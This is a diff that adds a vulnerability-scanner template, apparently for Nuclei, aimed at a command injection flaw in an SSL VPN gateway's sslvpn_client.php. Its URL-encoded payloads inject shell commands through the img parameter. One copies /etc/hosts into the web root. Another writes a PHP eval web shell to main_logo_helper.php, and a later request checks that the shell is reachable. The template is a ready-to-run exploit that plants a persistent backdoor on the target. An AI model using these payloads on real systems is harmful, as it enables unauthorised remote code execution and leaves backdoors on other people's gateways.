@@ -1,0 +1,127 @@
+id: multi-sslvpn-gateway-rce
+info:
+  name: Multiple Security Gateway Frontend RCE
+  author: Esonhugh-self-maintained
+  severity: critical
+  description: |
+    Multiple Security Gateway Frontend RCE
+  reference:
+    - "https://github.com/cqr-cryeye-forks/goby-pocs/blob/main/Multiple-Security-Gateway-Frontend-RCE.json"
+  tags: rce,shell,php,sslvpn
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/sslvpn/sslvpn_client.php"
+    redirects: true
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/sslvpn/sslvpn_client.php?client=logoImg&img={{randstr}}%20%2f%74%6d%70%20%7c%7c%20%63%70%20%2f%65%74%63%2f%68%6f%73%74%73%20%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%6d%61%69%6e%5f%6c%6f%67%6f%32%31%2e%74%78%74%20%7c%7c%20%6c%73"
+    headers:
+      Connection: close
+      Upgrade-Insecure-Requests: "1"
+      User-Agent: Mozilla/5.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+      Sec-Fetch-Site: same-origin
+      Sec-Fetch-Mode: navigate
+      Sec-Fetch-User: "?1"
+      Sec-Fetch-Dest: iframe
+      Referer: "{{BaseURL}}"
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.9
+      Content-Type: application/x-www-form-urlencoded
+    redirects: true
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{randstr}}"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/webui/images/basic/login/main_logo21.txt"
+    headers:
+      Connection: close
+      Upgrade-Insecure-Requests: "1"
+      User-Agent: Mozilla/5.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+      Sec-Fetch-Site: same-origin
+      Sec-Fetch-Mode: navigate
+      Sec-Fetch-User: "?1"
+      Sec-Fetch-Dest: iframe
+      Referer: "{{BaseURL}}"
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.9
+      Content-Type: application/x-www-form-urlencoded
+    redirects: true
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "localhost"
+
+  # Auto Inject Webshell at
+  # /usr/local/webui/webui/images/basic/login/main_logo_helper.php
+  - method: GET
+    path:
+      - "{{BaseURL}}/sslvpn/sslvpn_client.php?client=logoImg&img={{randstr}}%20/tmp%20%7C%7C%20echo%20%27%3CEnabled--%3E%3C%3Fphp%20%40eval%28%24_REQUEST%5B%22pass%22%5D%29%3B%20%3F%3E%20%27%20%3E%20/usr/local/webui/webui/images/basic/login/main_logo_helper.php%20%7C%7C%20ls"
+    headers:
+      Connection: close
+      Upgrade-Insecure-Requests: "1"
+      User-Agent: Mozilla/5.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+      Sec-Fetch-Site: same-origin
+      Sec-Fetch-Mode: navigate
+      Sec-Fetch-User: "?1"
+      Sec-Fetch-Dest: iframe
+      Referer: "{{BaseURL}}"
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.9
+      Content-Type: application/x-www-form-urlencoded
+    redirects: true
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{randstr}}"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/webui/images/basic/login/main_logo_helper.php"
+    headers:
+      Connection: close
+      Upgrade-Insecure-Requests: "1"
+      User-Agent: Mozilla/5.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+      Sec-Fetch-Site: same-origin
+      Sec-Fetch-Mode: navigate
+      Sec-Fetch-User: "?1"
+      Sec-Fetch-Dest: iframe
+      Referer: "{{BaseURL}}"
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.9
+      Content-Type: application/x-www-form-urlencoded
+    redirects: true
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<!--Enabled-->"
+    extractors:
+      - type: dsl
+        dsl:
+          - "body"
+# digest: 490a00463044022074760d59da3dfbf65665b46c7d3bacd41c026f6ae9e3530d1e2f4a4746db85fd022058b7125782c2beb6dada26d4958df0754417a9a3f24db4c3d9a85c554ee897b8:569246fd1e83ae0648e1a21ffb4fe811
